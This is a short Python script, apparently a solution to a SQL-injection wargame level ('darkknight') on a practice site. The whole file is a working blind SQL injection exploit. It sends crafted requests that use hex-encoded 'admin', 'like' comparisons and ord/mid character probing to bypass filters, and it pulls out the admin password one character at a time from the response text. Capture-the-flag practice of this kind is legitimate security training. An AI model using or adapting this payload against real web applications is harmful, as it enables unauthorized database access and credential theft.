import requests

#settings
pw=""
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="
session = dict(PHPSESSID="input_your_session_id!") #input your session id!


#starting Blind SQL Injection
for i in range(1, 9):
    for a in range(48,123):
        query=url+"0||id like 0x61646d696e%26%26ord(mid(pw,"+str(i)+",1)) like "+str(a)
        req = requests.post(query, cookies=session)

        if "Hello admin" in req.text:
            pw += chr(a)
            break

print("pw = " + pw)